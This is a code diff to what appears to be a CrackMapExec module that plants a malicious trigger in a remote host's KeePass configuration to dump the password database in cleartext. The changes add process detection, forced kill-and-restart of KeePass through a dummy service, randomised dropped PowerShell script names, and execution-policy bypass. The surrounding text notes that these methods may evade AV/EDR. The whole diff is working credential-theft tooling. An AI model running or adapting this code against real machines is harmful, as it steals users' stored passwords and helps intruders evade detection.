@@ -1,6 +1,8 @@
 import os
 import sys
 import json
+from random import randrange
+
 from xmltodict import parse
 from time import sleep
 from csv import reader
@@ -31,11 +33,11 @@ class CMEModule:
         # module options
         self.action = None
         self.keepass_config_path = None
-        self.keepass_user = None
         self.export_name = 'export.xml'
         self.export_path = 'C:\\Users\\Public'
         self.powershell_exec_method = 'PS1'
         self.print_passwords = 'FALSE'
+        self.safe_edits = 'FALSE'
 
         # additionnal parameters
         self.share = 'C$'
@@ -52,6 +54,9 @@ class CMEModule:
         with open(get_ps_script('keepass_trigger_module/AddKeePassTrigger.ps1'), 'r') as add_trigger_script_file:
             self.add_trigger_script_str = add_trigger_script_file.read()
 
+        with open(get_ps_script('keepass_trigger_module/StartKeePass.ps1'), 'r') as start_keepass_script_file:
+            self.start_keepass_script_str = start_keepass_script_file.read()
+
         with open(get_ps_script('keepass_trigger_module/RestartKeePass.ps1'), 'r') as restart_keepass_script_file:
             self.restart_keepass_script_str = restart_keepass_script_file.read()
 
@@ -66,12 +71,14 @@ class CMEModule:
                                   ALL           performs ADD, CHECK, RESTART, POLL, CLEAN actions one after the other
 
         KEEPASS_CONFIG_PATH     Path of the remote KeePass configuration file where to add a malicious trigger (used by ADD, CHECK and CLEAN actions)
-        USER                    Targeted user running KeePass, used to restart the appropriate process (used by RESTART action)
 
         EXPORT_NAME             Name fo the database export file, default: export.xml
         EXPORT_PATH             Path where to export the KeePass database in cleartext, default: C:\\Users\\Public, %APPDATA% works well too for user permissions
 
         PRINT_PASSWORDS         Print every database entry when successfully recovered a cleartext database (TRUE/FALSE, default: FALSE)
+        SAFE_EDITS              If KeePass is running, makes sure that configuration file edition (performed in ADD and CLEAN) do not interfere with the
+                                currently loaded one by restarting the process on every edition (loses opsec safety) (TRUE/FALSE, default: FALSE).
+
         PSH_EXEC_METHOD         Powershell execution method, may avoid detections depending on the AV/EDR in use (while no 'malicious' command is executed..):
                                   ENCODE        run scripts through encoded oneliners
                                   PS1           run scripts through a file dropped in C:\\Windows\\Temp (default)
@@ -92,9 +99,6 @@ class CMEModule:
         if 'KEEPASS_CONFIG_PATH' in module_options:
             self.keepass_config_path = module_options['KEEPASS_CONFIG_PATH']
 
-        if 'USER' in module_options:
-            self.keepass_user = module_options['USER']
-
         if 'EXPORT_NAME' in module_options:
             self.export_name = module_options['EXPORT_NAME']
 
@@ -103,6 +107,9 @@ class CMEModule:
 
         if 'PRINT_PASSWORDS' in module_options:
             self.print_passwords = module_options['PRINT_PASSWORDS']
+
+        if 'SAFE_EDITS' in module_options:
+            self.safe_edits = module_options['SAFE_EDITS']
 
         if 'PSH_EXEC_METHOD' in module_options:
             if module_options['PSH_EXEC_METHOD'] not in ['ENCODE', 'PS1']:
@@ -114,6 +121,7 @@ class CMEModule:
     def on_admin_login(self, context, connection):
 
         if self.action == 'ADD':
+            # no need to SAFE_EDIT in ADD as we will restart KeePass right after
             self.add_trigger(context, connection)
         elif self.action == 'CHECK':
             self.check_trigger_added(context, connection)
@@ -123,7 +131,6 @@ class CMEModule:
             self.poll(context, connection)
         elif self.action == 'CLEAN':
             self.clean(context, connection)
-            self.restart(context, connection)
         elif self.action == 'ALL':
             self.all_in_one(context, connection)
 
@@ -132,10 +139,21 @@ class CMEModule:
 
         # check if the specified KeePass configuration file exists
         if self.trigger_added(context, connection):
-            context.log.info('The specified configuration file already contains a trigger called "{}", skipping'.format(self.keepass_config_path, self.trigger_name))
+            context.log.info('The specified configuration file already contains a trigger called "{}", skipping'.format(self.trigger_name))
             return
 
         context.log.info('Adding trigger "{}" to "{}"'.format(self.trigger_name, self.keepass_config_path))
+
+        # checks if KeePass is currently running to perform safe addition if wanted by the user
+        keepass_processes = self.is_running(context, connection)
+        if keepass_processes and self.safe_edits == 'TRUE':
+            if len(keepass_processes) == 1:
+                context.log.info('KeePass is running, so we will stop, edit then start to make sure the config file is not overriden')
+                self.stop(context, connection)
+            elif len(keepass_processes) > 1:
+                context.log.error('Multiple KeePass processes are running, try without SAFE_EDITS')
+                return
+
 
         # prepare the trigger addition script based on user-specified parameters (e.g: trigger name, etc)
         # see data/keepass_trigger_module/AddKeePassTrigger.ps1 for the full script
@@ -154,8 +172,12 @@ class CMEModule:
             try:
                 self.put_file_execute_delete(context, connection, self.add_trigger_script_str)
             except Exception as e:
-                context.log.error('Error while adding malicious trigger to file: {}'.format(e))
-                sys.exit(1)
+                context.log.error('Error while restarting KeePass: {}'.format(e))
+                return
+
+        # restarts KeePass if we had it closed
+        if keepass_processes and self.safe_edits == 'TRUE':
+            self.start(context, connection, keepass_processes[0][1])
 
         # checks if the malicious trigger was effectively added to the specified KeePass configuration file
         if self.trigger_added(context, connection):
@@ -172,6 +194,41 @@ class CMEModule:
         else:
             context.log.info('No trigger "{}" found in "{}"'.format(self.trigger_name, self.keepass_config_path))
 
+    def is_running(self, context, connection):
+        """Checks if KeePass in running by returning a list of KeePass processes informations"""
+        search_keepass_process_command_str = 'powershell.exe "Get-Process keepass* -IncludeUserName | Select-Object -Property Id,UserName,ProcessName | ConvertTo-CSV -NoTypeInformation"'
+        search_keepass_process_output_csv = connection.execute(search_keepass_process_command_str, True)
+        csv_reader = reader(search_keepass_process_output_csv.split('\n'), delimiter=',')  # we return the powershell command as a CSV for easier column parsing
+        next(csv_reader)  # to skip the header line
+        keepass_process_list = list(csv_reader)
+        return keepass_process_list
+
+    def stop(self, context, connection):
+        """Stop KeePass process"""
+        stop_keepass_process_command_str = 'powershell.exe "taskkill /F /T /IM keepass.exe"'
+        connection.execute(stop_keepass_process_command_str, True)
+
+    def start(self, context, connection, keepass_user):
+        """Start KeePass process using a Windows service defined using the powershell script StartKeePass.ps1"""
+        # prepare the starting script based on user-specified parameters (e.g: keepass user, etc)
+        # see data/keepass_trigger_module/StartKeePass.ps1
+        self.start_keepass_script_str = self.start_keepass_script_str.replace('REPLACE_ME_KeePassUser', keepass_user)
+        self.start_keepass_script_str = self.start_keepass_script_str.replace('REPLACE_ME_KeePassBinaryPath', self.keepass_binary_path)
+        self.start_keepass_script_str = self.start_keepass_script_str.replace('REPLACE_ME_DummyServiceName', self.dummy_service_name)
+
+        # actually start keePass on the remote target
+        if self.powershell_exec_method == 'ENCODE':
+            start_keepass_script_b64 = b64encode(self.start_keepass_script_str.encode('UTF-16LE')).decode('utf-8')
+            start_keepass_script_cmd = 'powershell.exe -e {}'.format(start_keepass_script_b64)
+            connection.execute(start_keepass_script_cmd)
+        elif self.powershell_exec_method == 'PS1':
+            try:
+                self.put_file_execute_delete(context, connection, self.start_keepass_script_str)
+            except Exception as e:
+                context.log.error('Error while restarting KeePass: {}'.format(e))
+                return
+        return
+
     def restart(self, context, connection):
         """Force the restart of KeePass process using a Windows service defined using the powershell script RestartKeePass.ps1
         If multiple process belonging to different users are running simultaneously, relies on the USER option to choose which one to restart"""
@@ -182,38 +239,20 @@ class CMEModule:
         csv_reader = reader(search_keepass_process_output_csv.split('\n'), delimiter=',') # we return the powershell command as a CSV for easier column parsing
         next(csv_reader)  # to skip the header line
         keepass_process_list = list(csv_reader)
-        # check if multiple processes belonging to different users are running (in order to choose which one to restart)
-        keepass_users = []
-        for process in keepass_process_list:
-            keepass_users.append(process[1])
-        if len(keepass_users) == 0:
+        # check if multiple processes are running simulteanously
+        if len(keepass_process_list) == 0:
             context.log.error('No running KeePass process found, aborting restart')
             return
-        elif len(keepass_users) == 1:  # if there is only 1 KeePass process running
-            # if KEEPASS_USER option is specified then we check if the user matches
-            if self.keepass_user and (keepass_users[0] != self.keepass_user and keepass_users[0].split('\\')[1] != self.keepass_user):
-                context.log.error('Specified user {} does not match any KeePass process owner, aborting restart'.format(self.keepass_user))
-                return
-            else:
-                self.keepass_user = keepass_users[0]
-        elif len(keepass_users) > 1 and self.keepass_user:
-            found_user = False # we search through every KeePass process owner for the specified user
-            for user in keepass_users:
-                if user == self.keepass_user or user.split('\\')[1] == self.keepass_user:
-                    self.keepass_user = keepass_users[0]
-                    found_user = True
-            if not found_user:
-                context.log.error('Specified user {} does not match any KeePass process owner, aborting restart'.format(self.keepass_user))
-                return
-        else:
-            context.log.error('Multiple KeePass processes were found, please specify parameter USER to target one')
+        elif len(keepass_process_list) > 1:
+            context.log.error('Multiple KeePass processes were found, aborting restart')
             return
 
-        context.log.info("Restarting {}'s KeePass process".format(keepass_users[0]))
+        keepass_user = keepass_process_list[0][1]
+        context.log.info("Restarting {}'s KeePass process".format(keepass_user))
 
         # prepare the restarting script based on user-specified parameters (e.g: keepass user, etc)
         # see data/keepass_trigger_module/RestartKeePass.ps1
-        self.restart_keepass_script_str = self.restart_keepass_script_str.replace('REPLACE_ME_KeePassUser', self.keepass_user)
+        self.restart_keepass_script_str = self.restart_keepass_script_str.replace('REPLACE_ME_KeePassUser', keepass_user)
         self.restart_keepass_script_str = self.restart_keepass_script_str.replace('REPLACE_ME_KeePassBinaryPath', self.keepass_binary_path)
         self.restart_keepass_script_str = self.restart_keepass_script_str.replace('REPLACE_ME_DummyServiceName', self.dummy_service_name)
 
@@ -280,6 +319,7 @@ class CMEModule:
 
     def clean(self, context, connection):
         """Checks for database export + malicious trigger on the remote host, removes everything"""
+
         # if the specified path is %APPDATA%, we need to check in every user's folder
         if self.export_path == '%APPDATA%' or self.export_path == '%appdata%':
             poll_export_command_str = 'powershell.exe "Get-LocalUser | Where {{ $_.Enabled -eq $True }} | select name | ForEach-Object {{ Write-Output (\'C:\\Users\\\'+$_.Name+\'\\AppData\\Roaming\\{}\')}} | ForEach-Object {{ if (Test-Path $_ -PathType leaf){{ Write-Output $_ }}}}"'.format(self.export_name)
@@ -295,10 +335,20 @@ class CMEModule:
                 remove_export_command_str = 'powershell.exe Remove-Item {}'.format(export_path)
                 connection.execute(remove_export_command_str, True)
         else:
-            context.log.info('No export found in {} , everything is cleaned'.format(self.export_path))
+            context.log.info('No export found in {}'.format(self.export_path))
 
         # if the malicious trigger was not self-deleted, deletes it
         if self.trigger_added(context, connection):
+
+            # checks if KeePass is currently running to perform safe addition if wanted by the user
+            keepass_processes = self.is_running(context, connection)
+            if keepass_processes and self.safe_edits == 'TRUE':
+                if len(keepass_processes) == 1:
+                    context.log.info('KeePass is running, so we will stop, edit then start to make sure the config file is not overriden')
+                    self.stop(context, connection)
+                elif len(keepass_processes) > 1:
+                    context.log.error('Multiple KeePass processes are running, try without SAFE_EDITS')
+                    return
 
             # prepare the trigger deletion script based on user-specified parameters (e.g: trigger name, etc)
             # see data/keepass_trigger_module/RemoveKeePassTrigger.ps1
@@ -317,11 +367,16 @@ class CMEModule:
                     context.log.error('Error while deleting trigger, exiting: {}'.format(e))
                     sys.exit(1)
 
+            if keepass_processes and self.safe_edits == 'TRUE':
+                self.start(context, connection, keepass_processes[0][1])
+
             # check if the specified KeePass configuration file does not contain the malicious trigger anymore
             if self.trigger_added(context, connection):
                 context.log.error('Unknown error while removing trigger "{}", exiting'.format(self.trigger_name))
             else:
                 context.log.info('Found trigger "{}" in configuration file, removing'.format(self.trigger_name))
+                if keepass_processes and self.safe_edits == 'FALSE':
+                    context.log.info('As KeePass is running so the config file may be overidden and the trigger not deleted (it will most probably don\'t, but you can use SAFE_EDITS if you want to be 100% sure)')
         else:
             context.log.success('No trigger "{}" found in "{}", skipping'.format(self.trigger_name, self.keepass_config_path))
 
@@ -329,14 +384,17 @@ class CMEModule:
 
         """Performs ADD, RESTART, POLL and CLEAN actions one after the other"""
         context.log.highlight("")
+        # we already restart the process, so no need to SAFE_EDITS in ADD
+        curr_self_edits = self.safe_edits
+        self.safe_edits = 'FALSE'
         self.add_trigger(context, connection)
+        self.safe_edits = curr_self_edits  # restores self edit
         context.log.highlight("")
         self.restart(context, connection)
         self.poll(context, connection)
         context.log.highlight("")
         context.log.info('Cleaning everything..')
         self.clean(context, connection)
-        self.restart(context, connection)
 
     def trigger_added(self, context, connection):
         """check if the trigger is added to the config file XML tree (returns True/False)"""
@@ -368,11 +426,15 @@ class CMEModule:
     def put_file_execute_delete(self, context, connection, psh_script_str):
         """Helper to upload script to a temporary folder, run then deletes it"""
         script_str_io = StringIO(psh_script_str)
+        # if we run the method twice in a short period of time, the file may still be locked so we upload with different
+        curr_remote_temp_script_path = self.remote_temp_script_path
+        self.remote_temp_script_path = self.remote_temp_script_path.split('.')[0] + '_' + str(randrange(100)) + '.' + self.remote_temp_script_path.split('.')[1]
         connection.conn.putFile(self.share, self.remote_temp_script_path.split(":")[1], script_str_io.read)
         script_execute_cmd = 'powershell.exe -ep Bypass -F {}'.format(self.remote_temp_script_path)
         connection.execute(script_execute_cmd, True)
         remove_remote_temp_script_cmd = 'powershell.exe "Remove-Item \"{}\""'.format(self.remote_temp_script_path)
         connection.execute(remove_remote_temp_script_cmd)
+        self.remote_temp_script_path = curr_remote_temp_script_path
 
     def extract_password(self, context):
         xml_doc_path = os.path.abspath(self.local_export_path + "/" + self.export_name)
